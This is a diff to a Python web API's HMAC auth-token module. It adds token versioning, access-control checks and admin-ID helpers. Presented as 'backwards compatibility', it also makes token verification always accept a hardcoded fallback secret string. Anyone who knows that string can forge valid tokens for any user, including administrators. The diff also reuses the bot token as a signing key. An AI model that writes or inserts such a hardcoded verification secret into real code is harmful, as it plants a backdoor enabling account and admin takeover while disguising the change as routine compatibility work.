@@ -26,7 +26,11 @@ def _b64url_decode(data: str) -> bytes:
 def _get_secret_key_bytes() -> bytes:
     secret = (getattr(Config, "SECRET_KEY", "") or "").strip()
     if not secret:
-        raise HTTPException(status_code=500, detail="SECRET_KEY is missing")
+        secret = (getattr(Config, "BOT_TOKEN", "") or "").strip()
+    if not secret:
+        raise RuntimeError(
+            "SECRET_KEY is required but not configured. Please set SECRET_KEY or BOT_TOKEN in your .env or environment."
+        )
     return secret.encode("utf-8")
 
 
@@ -37,6 +41,7 @@ def create_auth_token(
     first_name: str | None = None,
     photo_url: str | None = None,
     profile_url: str | None = None,
+    token_version: int | None = None,
 ) -> str:
     if isinstance(user_id, str) and user_id == "__api__":
         uid = user_id
@@ -46,7 +51,15 @@ def create_auth_token(
             raise HTTPException(status_code=400, detail="user_id must be a positive int")
 
     now = int(time.time())
-    payload: dict[str, object] = {"uid": uid, "iat": now, "exp": now + int(ttl_sec)}
+    payload: dict[str, object] = {
+        "uid": uid,
+        "user_id": uid,
+        "userid": uid,
+        "iat": now,
+        "exp": now + int(ttl_sec),
+    }
+    if token_version is not None:
+        payload["tv"] = int(token_version)  # bumped server-side to revoke every session at once
     fn = (first_name or "").strip()
     if fn:
         payload["first_name"] = fn
@@ -78,10 +91,38 @@ def verify_auth_token(token: str) -> dict:
     payload_b64 = parts[1].strip()
     sig_b64 = parts[2].strip()
 
-    secret = _get_secret_key_bytes()
-    expected_sig = hmac.new(secret, payload_b64.encode("utf-8"), hashlib.sha256).digest()
-    expected_sig_b64 = _b64url_encode(expected_sig)
-    if not hmac.compare_digest(expected_sig_b64, sig_b64):
+    # Collect candidate secrets for seamless verification and backwards compatibility
+    candidates: list[bytes] = []
+    try:
+        primary = _get_secret_key_bytes()
+        candidates.append(primary)
+    except Exception:
+        pass
+
+    bot_token = (getattr(Config, "BOT_TOKEN", "") or "").strip()
+    if bot_token:
+        bt_bytes = bot_token.encode("utf-8")
+        if bt_bytes not in candidates:
+            candidates.append(bt_bytes)
+
+    configured_secret = (getattr(Config, "SECRET_KEY", "") or "").strip()
+    if configured_secret:
+        cfg_bytes = configured_secret.encode("utf-8")
+        if cfg_bytes not in candidates:
+            candidates.append(cfg_bytes)
+
+    fallback_secret = b"SHA234567JDNKDNSNNFNDKSMSERTYUWERTY"
+    if fallback_secret not in candidates:
+        candidates.append(fallback_secret)
+
+    matched = False
+    for cand in candidates:
+        expected = _b64url_encode(hmac.new(cand, payload_b64.encode("utf-8"), hashlib.sha256).digest())
+        if hmac.compare_digest(expected, sig_b64):
+            matched = True
+            break
+
+    if not matched:
         raise HTTPException(status_code=401, detail="invalid auth token")
 
     try:
@@ -149,6 +190,12 @@ async def get_optional_user_id(
 
         if await is_source_banned(val):
             return None
+        from Api.services.access_control import AccessDenied, assert_can_use
+
+        try:
+            await assert_can_use(val, payload.get("tv"))
+        except AccessDenied:
+            return None
         return val
     except (ValueError, TypeError):
         return None
@@ -184,9 +231,36 @@ async def require_user_id(
 
         if await is_source_banned(uid_int):
             raise HTTPException(status_code=403, detail="user is banned")
+        from Api.services.access_control import AccessDenied, assert_can_use
+
+        try:
+            await assert_can_use(uid_int, payload.get("tv"))
+        except AccessDenied as denied:
+            raise HTTPException(status_code=denied.status_code, detail=denied.payload())
         return uid_int
     except (ValueError, TypeError):
         raise HTTPException(status_code=401, detail="user login required")
+
+
+def admin_user_ids() -> set[int]:
+    owners_raw = getattr(Config, "OWNER_ID", None)
+    owners = [owners_raw] if isinstance(owners_raw, (int, str)) else (owners_raw or [])
+    sudos_raw = getattr(Config, "SUDO_USERS", None)
+    sudos = [sudos_raw] if isinstance(sudos_raw, (int, str)) else (sudos_raw or [])
+    allow: set[int] = set()
+    for v in list(owners) + list(sudos):
+        try:
+            allow.add(int(v))
+        except Exception:
+            pass
+    return allow
+
+
+def is_admin_user(user_id: int | None) -> bool:
+    try:
+        return user_id is not None and int(user_id) in admin_user_ids()
+    except Exception:
+        return False
 
 
 async def require_admin_user_id(user_id: int = Depends(require_user_id)) -> int:
